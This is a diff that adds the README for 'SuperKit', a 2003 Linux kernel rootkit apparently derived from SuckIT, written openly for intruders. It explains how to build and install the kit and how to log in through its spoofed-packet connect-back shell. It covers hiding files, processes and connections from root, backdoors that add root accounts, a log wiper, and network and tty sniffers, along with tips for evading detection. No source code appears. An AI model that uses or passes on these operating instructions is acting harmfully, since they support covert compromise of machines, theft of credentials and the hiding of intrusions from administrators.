@@ -1,0 +1,161 @@
+                         __
+   ____ ___  ____  _____/ /_____ __________ ______
+  / __ `__ \/ __ \/ ___/ __/ __ `/ ___/ __ `/ ___/
+ / / / / / / /_/ (__  ) /_/ /_/ / /  / /_/ / /__
+/_/ /_/ /_/\____/____/\__/\__,_/_/   \__,_/\___/
+
+		PRESENTS YOU THE
+          _____                       __ __ _ __        
+         / ___/__  ______  ___  _____/ //_/(_) /_       
+         \__ \/ / / / __ \/ _ \/ ___/ ,<  / / __/       
+        ___/ / /_/ / /_/ /  __/ /  / /| |/ / /_         
+       /____/\__,_/ .___/\___/_/  /_/ |_/_/\__/        
+                 /_/			   v1.1
+
+	Worlds *ONLY* user-friendly rootkit ;-)
+		
+		by mostarac @2003 <mostar@hotmail.com>
+
+
+* Disclaimer
+
+  The author of this tool is not responsible for the misuse of the
+  information provided in this code. In no event shall the author
+  be liable for any damages whatsoever arising out of or in
+  connection with the use or spread of this code. Any use of
+  this code is at the user's own risk. Please feel free to edit 
+  the source code or improve it at your own wishes.
+
+* Why?
+
+  - Due to fact that many rootkits recently are either
+    precompiled and full of backdoors or in other way
+    very hard to use, I decided to make an open-source
+    rootkit which would be easy to understand and use 
+    and still be scalable and powerfull. ALL passwords
+    are hashed and encrypted.
+
+    One passwd to conf'em all, One passwd to root'em
+    One passwd to bdor'em all and in the darkness sniff'em.
+
+* Shouts
+
+  - Goes mostly to SD, the author of SuckIT which this
+    rootkit is mostly based upon.
+  - All the youths out there who are eager to "learn" ;)
+  - Some of good people on this planet like:
+    FAMILY & GF (I actually got one)
+    LordSomer the father of LRK
+    PVC
+    Yugoslav Members of BlackHand
+    Djole(for bugging me to do it) 
+    nick0
+    rza
+    old members of #Bosnia,#Croatia,#Serbia@ircnet (1995-2001)
+    kitties of #etcpub@ircnet
+    girlies of #darknet@efnet
+    kiddies of #l33tsecurity@efnet 
+    some nameless friends from ex-defcom(was never part of it)
+    and all other computer freaks that prefer girls in JPG format.
+
+* Quick info
+
+   Rootkit that hides files, processes, and connections. Provides 
+   a password protected remote access connect-back shell initiated 
+   by a spoofed packet. Loaded via /dev/kmem, without support for 
+   loadable modules required. Cannot be detected by checking the 
+   syscall table, because it redirects the kernel entry point to a 
+   private copy of the syscall table. Couple of backdoors included.
+
+1. Installation
+
+   Installation is fairly simple. Just type 'make config'
+   and then make, and you will have an 'inst' file which is
+   complete archive of your rootkit. The 'inst' file can be
+   modified to satisfy your needs, either trough 'make config'
+   procedure and/or by editing variables in the 'inst' file itself.
+
+   $ make config
+   $ make
+   $ vi inst (if you want to make some changes)
+   $ ./inst
+
+   inst script is your standalone rootkit with all tools included.
+
+   Compiled binary ./login is not password-binded and can therefore
+   be used with all installations of SuperKit regarding the settings.
+
+2. Includes
+
+   In this rootkit are included tools for making your business 
+   a *LOT* easier.
+   a) Password protected backdoor - gives you instant root on passwd
+   b) CGI backdoor password protected - access via hidden cgi binary
+	* CGI backdoor supports adding root account on the box
+          with the *SAME* password as rootkit.
+   c) Log wiper 
+   d) Simple tcpsniffer (needs manual startup)
+   e) Implemented command line sniffer(tty snarfer), snoop-tha-root :-)
+
+3. Usage
+
+   After the completion of installation on the box of your choice
+   you can login to that box directly by using the login binary
+   which got compiled in the package. Login binary is generic and
+   can be used with any installation of your rootkit. You can use
+   it by typing ./login -h hostname and you will enter the box.
+   Feel free to edit your 'inst' file to customize your needs.
+   You should change names of your binaries to personalize your 
+   rookit even more to avoid detection. For hiding files, 
+   everything must be named *sk ie. sniffsk. REMEMBER, when you
+   enter the rootkited box via this SuperKit, processes and files 
+   will be visible only for YOU and not for everyone else. Root 
+   will NOT be able to see any of your files/activities as long as 
+   you enter the box with ./login -h box.
+
+   SuperKit has NO open ports and is NOT visible on lsof.
+   This is a tool that makes you virtually invisible. But novadays
+   nothing makes you 100% secure and nothing makes you 100% hidden.
+   Advice is to always be on guard. 
+
+4. FAQ
+
+   Q: I recompiled sk and it loses contact with kernel instance
+     running somewhere, what I could do ?
+   A: Please! Use ONE binary at the time! Each iteration of make config
+     will generate unique version which can not be used with any
+     later nor further iterations![btw, that will crash at the time anyway]
+
+   Q: Loggin' to machine takes a lot of time, how to speed up this process ?
+   A: Ports on given box were filtered, and client is waiting for TCP
+     handshake, so you have to specify explicitly destination port, f.e.
+     ./login -h your.loved.box.cz -d 80
+     dns (53), www(80) ssh(22) is the probably most good choices.
+
+   Q: I want to execute some init script each boot of a box, what I should do ?
+   A: Create shell script called '.rc' in your sk home directory. Take into
+     account that it will get executed imediately with sk (=init), so
+     putting sleep 300 there would be good idea before doing something.
+
+   Q: Where are the sniffer logs?
+   A: In SuperKit there are two kinds of sniffers. One is a simple TCP linux
+      sniffer called sniffersk(RENAME IT) and it saves its files in ~/.snifflogsk
+      (CONFIG RENAME IT), the other one is command line sniffer which is called 
+      ~/.ttylogsk(CONFIG RENAME IT). Note that this file must be at least chmod 222, 
+      because sniffed pids writes to this file with their [e]uid.
+
+   Q: When I make some pid invisible, it still appears in `ps` and `top`
+     listing, what's wrong ?
+   A: Filtering out /proc records is only for non-SuperKit, regular, users.
+     That means, it doesn't affect YOU when your shell is invisible.
+     *KEEP IN THE MIND* that SuperKit doesn't twist informations
+     in system for YOU(when logged in via login binary), it does only that 
+     for REST of the world (including root).
+  
+   Q: How do I safely remove superkit from machine?
+   A: Well you need to copy back your backup init+prefix in /sbin to /sbin/init
+      and either to unload superkit with ./sk -u or reboot your box.
+
+Now go and smash those stacks for fun and profit ;)
+	Wish you a lot of education trough fun.
+			 - mostarac <mostar@hotmail.com>
